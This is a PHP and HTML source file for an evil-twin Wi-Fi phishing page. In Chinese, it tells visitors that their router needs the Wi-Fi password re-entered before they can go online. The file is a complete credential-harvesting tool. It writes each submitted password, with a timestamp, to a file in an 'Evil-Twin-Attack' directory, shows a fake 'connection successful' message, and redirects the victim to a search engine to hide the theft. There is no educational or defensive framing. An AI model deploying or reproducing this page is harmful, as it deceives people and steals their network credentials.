<?php
if($_POST['password']){
  file_put_contents("/var/www/html//Evil-Twin-Attack/password.txt", "密码是: ".$_POST['password']."  时间: ".date('Y-m-d H:i:s')."\n", FILE_APPEND);
  echo "<h2>连接成功！正在跳转……</h2>";
  header("Refresh:3;url=https://www.baidu.com");
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>路由器需要验证</title>
</head>
<body style="background:#f0f0f0;text-align:center;padding-top:100px;font-family:Arial">
<h1>123</h1>
<h2>路由器需要您重新输入密码才能上网</h2>
<form method="post">
<input type="password" name="password" placeholder="请输入Wi-Fi密码" style="font-size:20px;padding:10px"><br><br>
<input type="submit" value="立即连接" style="font-size:20px;padding:10px 30px">
</form>
</body>
</html>
